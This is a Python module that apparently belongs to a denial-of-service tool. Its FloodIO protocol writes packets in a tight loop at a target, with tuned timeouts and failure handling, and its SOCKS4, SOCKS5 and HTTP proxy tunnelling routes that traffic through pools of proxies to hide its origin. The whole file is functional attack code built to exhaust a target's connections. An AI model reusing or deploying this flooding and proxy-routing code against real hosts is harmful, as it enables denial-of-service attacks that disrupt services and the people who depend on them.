import asyncio
import errno
from functools import partial
import io
from ssl import SSLContext
import time
from types import GeneratorType
from typing import Any, BinaryIO, Callable, Generator, Optional, Tuple

from python_socks.async_.asyncio._proxy import HttpProxy, Socks4Proxy, Socks5Proxy
from python_socks.async_.asyncio import Proxy
from python_socks._proto import socks4, socks5, http as http_proto

from .core import logger, CONN_PROBE_PERIOD
from .proxies import ProxySet
from .targets import TargetStats


FloodSpecGen = Generator[Tuple[int, Any], None, None]


class FloodOp:
    WRITE = 0
    READ  = 1
    SLEEP = 2


class FloodSpec:

    # XXX: this API might be handy but `isinstance` calls are incredibly slow
    @classmethod
    def from_any(cls, spec, *args) -> FloodSpecGen:
        if isinstance(spec, GeneratorType):
            return spec
        if isinstance(spec, bytes):
            return cls.from_static(spec, *args)
        if callable(spec):
            return cls.from_callable(spec, *args)
        raise ValueError(f"Don't know how to create spec from {type(spec)}")

    @staticmethod
    def from_static(packet: bytes, num_packets: int) -> FloodSpecGen:
        packet_size = len(packet)
        for _ in range(num_packets):
            yield FloodOp.WRITE, (packet, packet_size)

    @staticmethod
    def from_callable(packet: Callable[[], bytes], num_packets: int) -> FloodSpecGen:
        for _ in range(num_packets):
            _packet: bytes = packet()
            yield FloodOp.WRITE, (_packet, len(_packet))


# XXX: add instrumentation to keep track of connection lifetime,
#      number of ops per open connection, and more
class FloodIO(asyncio.Protocol):

    def __init__(
        self,
        loop: asyncio.AbstractEventLoop,
        on_close: asyncio.Future,
        stats: TargetStats,
        settings: "AttackSettings",
        flood_spec: FloodSpecGen,
        on_connect: Optional[asyncio.Future] = None,
        debug: bool = False,
    ):
        self._loop = loop
        self._stats = stats
        self._flood_spec = flood_spec
        self._settings = settings
        self._on_close: asyncio.Future = on_close
        self._on_close.add_done_callback(self._handle_cancellation)
        self._debug = debug
        self._on_connect = on_connect
        self._transport = None
        self._handle = None
        self._paused: bool = False
        self._paused_at: Optional[int] = None
        self._read_waiting: bool = False
        self._return_code: bool = False
        self._connected_at: Optional[int] = None
        self._probe_handle = None
        self._num_steps: int = 0

    def connection_made(self, transport) -> None:
        self._stats.track_open_connection()
        self._connected_at = time.perf_counter()
        if self._on_connect and not self._on_connect.done():
            self._on_connect.set_result(True)
        self._transport = transport
        self._transport.set_write_buffer_limits(high=self._settings.high_watermark)
        if hasattr(self._transport, "pause_reading"):
            self._transport.pause_reading()
        self._handle = self._loop.call_soon(self._step)
        self._prob_handle = self._loop.call_later(CONN_PROBE_PERIOD, self._probe)

    def _probe(self) -> None:
        # the approach with "probing" instead of direct timeouts tracking (e.g.
        # with loop.call_later) is used to decrease pressure on the event loop.
        # most drains take < 0.1 seconds, which means that each connection is
        # going to generate too many timers/callbacks during normal operations.
        # probing each 5 seconds allows to catch timeouts with ~5s precision while
        # keeping number of callbacks relatively low
        self._probe_handle = None
        if not self._transport: return
        if self._paused_at is not None:
            resumed_after = time.time() - self._paused_at
            if resumed_after > self._settings.drain_timeout_seconds:
                # XXX: it might be the case that network is overwhelmed, which means
                #      it's gonna be wise to track special status for the scheduler
                #      to delay re-launch of the task
                self._transport.abort()
                self._transport = None
                if self._debug:
                    target, method, _ = self._stats.target
                    logger.info(
                        f"Writing resumed too late (bailing)\t{target.human_repr()}\t{method}"
                        f"\t{resumed_after}\t{self._num_steps}")
                return
        self._probe_handle = self._loop.call_later(5, self._probe)

    def data_received(self, data) -> None:
        # overall, we don't use data at all
        # do something smarter when corresponding opcode is introduced
        # we also don't track size of the data received. the only use
        # for the read opcode right now is to make sure something was
        # read from the network. in such a case, use of operations like
        # read(1) does not make much of sense (as the data is already
        # buffered anyways)
        if not self._transport: return
        if hasattr(self._transport, "pause_reading"):
            self._transport.pause_reading()
        if self._read_waiting:
            self._read_waiting = False
            self._loop.call_soon(self._step)

    def eof_received(self) -> None:
        pass

    def connection_lost(self, exc) -> None:
        self._stats.track_close_connection()
        self._transport = None
        if self._handle:
            self._handle.cancel()
        if self._probe_handle:
            self._probe_handle.cancel()
        if self._on_close.done(): return
        if exc is None:
            self._on_close.set_result(self._return_code)
        elif isinstance(exc, IOError) and exc.errno == errno.EPIPE:
            # EPIPE exception here means that the connection was interrupted
            # we still consider connection to the target "succesful", no need
            # to bump our failure budget
            # As we typically pause reading, it's unlikely to process EOF from
            # the peer properly. Thus EPIPE instead is expected to happen.
            self._on_close.set_result(self._return_code)
        else:
            self._on_close.set_exception(exc)

    def pause_writing(self) -> None:
        if self._paused: return
        self._paused, self._paused_at = True, time.time()

    def resume_writing(self) -> None:
        if not self._paused: return
        self._paused, self._paused_at = False, None
        if not self._transport: return
        if self._handle is None:
            # XXX: there's an interesting race condition here
            #      as it might happen multiple times
            self._handle = self._loop.call_soon(self._step)

    def _step(self, resumed: bool = False) -> None:
        if not self._transport: return
        self._num_steps += 1
        self._return_code = True
        try:
            # XXX: this is actually less flexible than would be necessary
            #      as we still need to keep track of current op & stash
            op, args = next(self._flood_spec)
            if op == FloodOp.WRITE:
                packet, size = args
                self._transport.write(packet)
                self._stats.track(1, size)
                self._handle = None
                if not self._paused:
                    self._handle = self._loop.call_soon(self._step)
            elif op == FloodOp.SLEEP:
                self._handle = self._loop.call_later(args, self._step)
            elif op == FloodOp.READ:
                # XXX: what about read timeout, do we even need it?
                #      (it might be okay as long as connection is consumed)
                self._read_waiting = True
                if hasattr(self._transport, "resume_reading"):
                    self._transport.resume_reading()
            else:
                raise ValueError(f"Unknown flood opcode {op}")
        except StopIteration:
            self._transport.close()
            self._transport = None

    def _handle_cancellation(self, on_close):
        if on_close.cancelled() and self._transport and not self._transport.is_closing():
            self._transport.abort()
            self._transport = None


class ProxyProtocol(asyncio.Protocol):

    def __init__(
        self,
        proxies: ProxySet,
        proxy_url: str,  # XXX: is one is only used for the logging
        proxy: Proxy,
        loop: asyncio.AbstractEventLoop,
        on_close: asyncio.Future,
        dest: Tuple[str, int],
        ssl: Optional[SSLContext],
        downstream_factory: Callable[[], asyncio.Protocol],
        connect_timeout: int = 30,
        on_connect = None
    ):
        logger.debug(f"Factory called for {proxy_url}")
        self._loop = loop
        self._transport = None
        self._downstream_factory = downstream_factory
        self._downstream_protocol = None
        self._downstream_pause_writing = None
        self._downstream_resume_writing = None
        self._proxies = proxies
        self._proxy_url = proxy_url
        self._proxy = proxy
        self._dest = dest
        self._ssl = ssl
        self._on_close = on_close
        self._on_close.add_done_callback(self._handle_cancellation)
        self._dest_connected = False
        self._dest_connect_timer = None
        self._dest_connect_timeout = connect_timeout
        self._on_connect = on_connect

    def connection_made(self, transport):
        logger.debug(f"Connected to {self._proxy_url}")
        assert self._transport is None
        self._transport = transport
        assert self._dest_connect_timer is None
        self._dest_connect_timer = self._loop.call_later(
            self._dest_connect_timeout, self._abort_connection)
        self._kickoff_negotiate()

    def _kickoff_negotiate(self):
        raise NotImplemented

    def connection_lost(self, exc):
        logger.debug(f"Disconnected from {self._proxy_url} {exc}")
        self._transport = None
        if self._downstream_protocol is not None:
            self._downstream_protocol.connection_lost(exc)
        if self._on_connect and not self._on_connect.done():
            self._on_connect.set_result(False)
        if self._on_close.done():
            return
        if exc is not None:
            self._on_close.set_exception(exc)
        else:
            self._on_close.set_result(None)

    def pause_writing(self):
        if self._downstream_pause_writing is not None:
            self._downstream_pause_writing()

    def resume_writing(self):
        if self._downstream_resume_writing is not None:
            self._downstream_resume_writing()

    def data_received(self, data):
        n_bytes = len(data)
        logger.debug(f"Receieved data from {self._proxy_url} {n_bytes} bytes")
        if self._dest_connected:
            self._downstream_protocol.data_received(data)
        else:
            try:
                self._negotiate_data_received(data)
            except Exception as exc:
                logger.debug(f"Processing failed for {self._proxy_url} with {exc}")
                if not self._on_close.done():
                    self._on_close.set_exception(exc)
                    self._transport.abort()

    def _negotiate_data_received(self, data):
        raise NotImplemented

    def eof_received(self):
        if self._downstream_protocol is not None:
            self._downstream_protocol.eof_received()

    def _handle_cancellation(self, on_close):
        if on_close.cancelled() and self._transport and not self._transport.is_closing:
            self._transport.abort()
            self._transport = None

    def _dest_connection_made(self):
        assert not self._dest_connected
        self._dest_connected = True
        self._downstream_protocol = self._downstream_factory()
        if hasattr(self._downstream_protocol, "pause_writing"):
            self._downstream_pause_writing = self._downstream_protocol.pause_writing
        if hasattr(self._downstream_protocol, "resume_writing"):
            self._downstream_resume_writing = self._downstream_protocol.resume_writing
        if self._ssl is None:
            self._cancel_dest_connect_timer()
            logger.debug(f"Dest is connected through {self._proxy_url}")
            self._proxies.track_alive(self._proxy_url)
            self._downstream_protocol.connection_made(self._transport)
        else:
            _tls = self._loop.create_task(
                self._loop.start_tls(self._transport, self._downstream_protocol, self._ssl))
            _tls.add_done_callback(self._setup_downstream_tls)

    def _cancel_dest_connect_timer(self):
        if self._dest_connect_timer is not None:
            self._dest_connect_timer.cancel()
            self._dest_connect_timer = None

    def _setup_downstream_tls(self, task):
        self._cancel_dest_connect_timer()
        try:
            transport = task.result()
            if not self._transport: return
            if transport:
                self._proxies.track_alive(self._proxy_url)
                self._downstream_protocol.connection_made(transport)
                logger.debug(f"Dest is connected through {self._proxy_url}")
            else:
                self._transport.abort()
        except Exception as exc:
            if not self._on_close.done():
                self._on_close.set_exception(exc)
                self._transport.abort()

    def _abort_connection(self):
        logger.debug(f"Response timeout for {self._proxy_url}")
        if not self._on_close.done():
            # XXX: most likely this should be timeout exception rather than None
            self._on_close.set_result(None)
        if self._transport is not None:
            self._transport.abort()
            self._transport = None


class ProxyError(IOError):
    pass


# XXX: this could be proper ABC
class Socks4Protocol(ProxyProtocol):

    def _kickoff_negotiate(self):
        self._dest_connect()

    def _negotiate_data_received(self, data):
        assert len(data) == 8, "SOCKS4: invalid response (wrong packet size)"
        # we are not validating addr, port pair
        if data[0] != socks4.RSV:
            raise ProxyError("SOCKS4: proxy server sent invalid data")
        status = ord(data[1:2])
        if status != socks4.ReplyCode.REQUEST_GRANTED:
            status_error = socks4.ReplyMessages.get(status, "Unknown error")
            raise ProxyError(f"SOCKS4: wrong status {status_error}")
        self._dest_connection_made()

    def _dest_connect(self):
        addr, port = self._dest
        req = socks4.ConnectRequest(host=addr, port=port, user_id=None, rdns=False)
        req.set_resolved_host(addr)
        self._transport.write(bytes(req))


# XXX: netty's top-level performance trick: reuse pipeline and handler objects
#      curious if this can be done in Python efficiently
class Socks5Protocol(ProxyProtocol):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._auth_method_req = None
        self._auth_method = None
        self._auth_done = False
        self._auth_req_sent = False

    def _negotiate_data_received(self, data):
        n_bytes = len(data)
        if self._auth_done:
            # expecting connect response
            self._read_connect_response(data)
            self._dest_connection_made()
        elif self._auth_method_req and self._auth_method is None:
            # expecting auth method response
            assert n_bytes == 2, "SOCKS5: invalid auth method response (wrong packet size)"
            res = socks5.AuthMethodsResponse(data)
            res.validate(request=self._auth_method_req)
            self._auth_method = res.auth_method
            if self._auth_method == socks5.AuthMethod.USERNAME_PASSWORD:
                req = socks5.AuthRequest(
                    username=self._proxy._username, password=self._proxy._password)
                self._transport.write(bytes(req))
                self._auth_req_sent = True
                logger.debug(f"Sent user/pass for {self._proxy_url}")
            else:
                self._auth_done = True
                logger.debug(f"Auth is ready for {self._proxy_url}")
                self._dest_connect()
        elif self._auth_method_req and self._auth_method is not None:
            # expecting auth response
            assert n_bytes == 2, "SOCKS5: invalid auth response (wrong packet size)"
            res = socks5.AuthResponse(data)
            res.validate()
            self._auth_done = True
            logger.debug(f"Auth is ready for {self._proxy_url}")
            self._dest_connect()
        else:
            raise ProxyError("SOCKS5: invalid state")

    def _read_exactly(self, buffer: BinaryIO, n: int) -> bytes:
        data = buffer.read(n)
        if len(data) < n:
            raise ProxyError("SOCKS5: invalid response (wrong packet size)")
        return data

    def _read_connect_response(self, data: bytes) -> None:
        buffer = io.BytesIO(data)
        (socks_ver,) = self._read_exactly(buffer, 1)
        if socks_ver != socks5.SOCKS_VER:
            raise ProxyError("SOCKS5: unexpected version number")
        (reply,) = self._read_exactly(buffer, 1)
        if reply != socks5.ReplyCode.GRANTED:
            error_message = socks5.ReplyMessages.get(reply, 'Unknown error')
            raise ProxyError(f"SOCKS5: invalid reply code {error_message}")
        (rsv,) = self._read_exactly(buffer, 1)
        if rsv != socks5.RSV:
            raise ProxyError("SOCKS5: invalid reserved byte")
        (addr_type,) = self._read_exactly(buffer, 1)
        if addr_type == 0x01:
            self._read_exactly(buffer, 4)
        elif addr_type == 0x03:
            length = self._read_exactly(buffer, 1)
            self._read_exactly(buffer, ord(length))
        elif addr_type == 0x04:
            self._read_exactly(buffer, 16)
        else:
            raise ProxyError("SOCKS5: proxy server sent invalid data")
        self._read_exactly(buffer, 2)
        if buffer.read(1):
            raise ProxyError("SOCKS5: invalid response (excessive data)")

    def _kickoff_negotiate(self):
        self._request_auth_methods()

    def _request_auth_methods(self):
        assert self._auth_method_req is None
        self._auth_method_req = socks5.AuthMethodsRequest(
            username=self._proxy._username,
            password=self._proxy._password,
        )
        self._transport.write(bytes(self._auth_method_req))
        logger.debug(f"Sent auth methods req to {self._proxy_url}")

    def _dest_connect(self):
        assert not self._dest_connected
        addr, port = self._dest
        req = socks5.ConnectRequest(host=addr, port=port, rdns=False)
        req.set_resolved_host(addr)
        self._transport.write(bytes(req))
        logger.debug(f"Sent connection req to {self._proxy_url}")


class HttpTunelProtocol(ProxyProtocol):

    def _kickoff_negotiate(self):
        self._dest_connect()

    def _negotiate_data_received(self, data):
        status_line = io.BytesIO(data).readline().decode("utf-8", "surrogateescape")

        if not status_line:
            raise ProxyError("HTTP: connection closed unexpectedly")

        status_line = status_line.rstrip()
        try:
            proto, status_code, status_msg = status_line.split(" ", 2)
        except ValueError:
            raise ProxyError("HTTP: proxy server sent invalid response")

        if not proto.startswith("HTTP/"):
            raise ProxyError("HTTP: proxy server does not appear to be an HTTP proxy")

        try:
            status_code = int(status_code)
        except ValueError:
            raise ProxyError("HTTP: proxy server did not return a valid HTTP status")

        if status_code not in {200, 201, 204}:
            raise ProxyError(f"HTTP: proxy server sent non-200 HTTP status {status_line}")

        self._dest_connection_made()

    def _dest_connect(self):
        addr, port = self._dest
        # XXX: remove user agent field?
        req = http_proto.ConnectRequest(
            host=addr, port=port, login=self._proxy._username, password=self._proxy._password)
        self._transport.write(bytes(req))


_CONNECTORS = {
    Socks4Proxy: Socks4Protocol,
    Socks5Proxy: Socks5Protocol,
    HttpProxy:   HttpTunelProtocol,
}

def for_proxy(proxies: ProxySet, proxy_url: str) -> Tuple[Proxy, Callable[[], asyncio.Protocol]]:
    proxy = Proxy.from_url(proxy_url)
    proxy_protocol = _CONNECTORS[type(proxy)]
    return proxy, partial(proxy_protocol, proxies, proxy_url, proxy)

